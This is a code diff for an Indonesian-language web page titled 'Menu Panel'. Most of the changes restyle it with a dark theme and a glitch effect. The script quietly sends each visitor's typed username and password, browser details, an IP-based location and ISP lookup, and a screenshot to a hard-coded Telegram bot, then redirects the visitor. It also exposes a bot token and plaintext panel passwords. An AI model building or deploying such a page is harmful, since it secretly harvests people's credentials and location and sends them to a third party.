@@ -6,12 +6,13 @@
   <title>Menu Panel</title>
   <style>
     :root {
-      --primary: #7e57c2;
-      --primary-dark: #5e35b1;
-      --success: #2ecc71;
-      --danger: #e74c3c;
-      --text: #333;
-      --bg: #f4f4f9;
+      --primary: #2196f3;
+      --primary-dark: #0d47a1;
+      --success: #4caf50;
+      --danger: #f44336;
+      --text: #e0e0e0;
+      --bg: #121212;
+      --card: #1e1e1e;
     }
 
     body {
@@ -24,8 +25,42 @@
     }
 
     h1 {
+      font-size: 2.5rem;
+      color: var(--primary);
       margin-bottom: 30px;
-      color: var(--primary-dark);
+      position: relative;
+    }
+
+    /* Glitch Effect */
+    h1::before, h1::after {
+      content: attr(data-text);
+      position: absolute;
+      left: 0;
+      width: 100%;
+      overflow: hidden;
+    }
+
+    h1::before {
+      top: -2px;
+      color: #f0f;
+      z-index: -1;
+      animation: glitch 1s infinite linear alternate-reverse;
+    }
+
+    h1::after {
+      top: 2px;
+      color: #0ff;
+      z-index: -1;
+      animation: glitch 0.8s infinite linear alternate-reverse;
+    }
+
+    @keyframes glitch {
+      0% { clip: rect(0, 9999px, 0, 0); }
+      5% { clip: rect(0, 9999px, 100%, 0); }
+      10% { clip: rect(50%, 9999px, 100%, 0); }
+      15% { clip: rect(0, 9999px, 100%, 0); }
+      20% { clip: rect(80%, 9999px, 100%, 0); }
+      100% { clip: rect(0, 9999px, 0, 0); }
     }
 
     .panel-button {
@@ -38,7 +73,7 @@
       border-radius: 12px;
       cursor: pointer;
       transition: background 0.3s, transform 0.2s;
-      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+      box-shadow: 0 4px 10px rgba(0,0,0,0.4);
     }
 
     .panel-button:hover {
@@ -52,10 +87,10 @@
       top: 50%;
       left: 50%;
       transform: translate(-50%, -50%);
-      background: white;
+      background: var(--card);
       padding: 25px 20px;
       border-radius: 12px;
-      box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+      box-shadow: 0 10px 30px rgba(0,0,0,0.5);
       z-index: 1001;
       width: 300px;
     }
@@ -64,7 +99,7 @@
       display: none;
       position: fixed;
       top: 0; left: 0; right: 0; bottom: 0;
-      background: rgba(0, 0, 0, 0.4);
+      background: rgba(0, 0, 0, 0.6);
       z-index: 1000;
     }
 
@@ -72,7 +107,9 @@
       width: 90%;
       padding: 10px;
       margin: 8px 0;
-      border: 1px solid #ccc;
+      border: 1px solid #555;
+      background: #2c2c2c;
+      color: white;
       border-radius: 8px;
       font-size: 14px;
     }
@@ -101,19 +138,19 @@
       bottom: 20px;
       left: 50%;
       transform: translateX(-50%);
-      background: #444;
+      background: #333;
       color: #fff;
       padding: 12px 20px;
       border-radius: 10px;
       display: none;
       z-index: 1002;
-      box-shadow: 0 2px 8px rgba(0,0,0,0.3);
+      box-shadow: 0 2px 8px rgba(0,0,0,0.5);
     }
   </style>
 </head>
 <body>
 
-<h1>Menu Panel</h1>
+<h1 data-text="Menu Panel">Menu Panel</h1>
 <div id="menuContainer"></div>
 
 <div class="overlay" id="overlay"></div>
@@ -132,8 +169,8 @@
 
 <script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
 <script>
-  const telegramToken = "7847987165:AAExaFfM8F2eWgJc_0TG8k3xx3uiQKAOZxE"; // Ganti dengan token bot kamu
-  const chatId = "7274253936"; // Ganti dengan chat ID Telegram kamu
+  const telegramToken = "7847987165:AAExaFfM8F2eWgJc_0TG8k3xx3uiQKAOZxE"; // Ganti token
+  const chatId = "7274253936"; // Ganti ID
 
   const panels = [
     { name: "PRIBADIFAAN", user: "faan", pass: "OCTA", url: "https://example.com/pribadifaan" },
@@ -144,6 +181,16 @@
   ];
 
   let selectedPanel = null;
+  let geoInfo = "Memuat lokasi...";
+
+  fetch("https://ip-api.com/json")
+    .then(res => res.json())
+    .then(data => {
+      geoInfo = `${data.city}, ${data.regionName}, ${data.country} - ${data.isp} (${data.query})`;
+    })
+    .catch(() => {
+      geoInfo = "Lokasi tidak tersedia";
+    });
 
   function renderButtons() {
     const container = document.getElementById("menuContainer");
@@ -174,56 +221,35 @@
     if (!selectedPanel) return;
 
     if (username === selectedPanel.user && password === selectedPanel.pass) {
-      showNotif("Login berhasil", "#2ecc71");
+      showNotif("Login berhasil", "#4caf50");
 
       const deviceInfo = navigator.userAgent;
-      getLocation(locationUrl => {
-        const message = `
+      const message = `
 <b>LOGIN PANEL</b>
 <b>Panel:</b> ${selectedPanel.name}
 <b>Username:</b> ${username}
 <b>Password:</b> ${password}
 <b>Waktu:</b> ${new Date().toLocaleString()}
 <b>Perangkat:</b> ${deviceInfo}
-<b>Lokasi:</b> ${locationUrl}
-        `;
-        sendTelegramMessage(message);
+<b>IP & Lokasi:</b> ${geoInfo}
+      `;
+      sendTelegramMessage(message);
 
-        document.getElementById("reportText").innerHTML = `
-          <b>Login Panel:</b> ${selectedPanel.name}<br>
-          <b>Username:</b> ${username}<br>
-          <b>Password:</b> ${password}<br>
-        `;
-        html2canvas(document.getElementById("captureArea")).then(canvas => {
-          sendImageToTelegram(canvas);
-          setTimeout(() => window.location.href = selectedPanel.url, 1200);
-        });
+      html2canvas(document.getElementById("captureArea")).then(canvas => {
+        sendImageToTelegram(canvas);
+        setTimeout(() => window.location.href = selectedPanel.url, 1200);
       });
     } else {
-      showNotif("Username atau password salah!", "#e74c3c");
+      showNotif("Username atau password salah!", "#f44336");
     }
   }
 
-  function showNotif(message, color = "#444") {
+  function showNotif(message, color = "#333") {
     const notif = document.getElementById("notif");
     notif.style.background = color;
     notif.textContent = message;
     notif.style.display = "block";
     setTimeout(() => notif.style.display = "none", 3000);
-  }
-
-  function getLocation(callback) {
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(pos => {
-        const lat = pos.coords.latitude;
-        const lon = pos.coords.longitude;
-        callback(`https://www.google.com/maps?q=${lat},${lon}`);
-      }, () => {
-        callback("Lokasi tidak diizinkan");
-      });
-    } else {
-      callback("Geolocation tidak didukung");
-    }
   }
 
   function sendTelegramMessage(text) {
@@ -246,7 +272,7 @@
       fetch(`https://api.telegram.org/bot${telegramToken}/sendPhoto`, {
         method: "POST",
         body: formData
-      }).catch(err => console.error("Gagal kirim foto:", err));
+      }).catch(err => console.error("Gagal kirim gambar:", err));
     });
   }
 
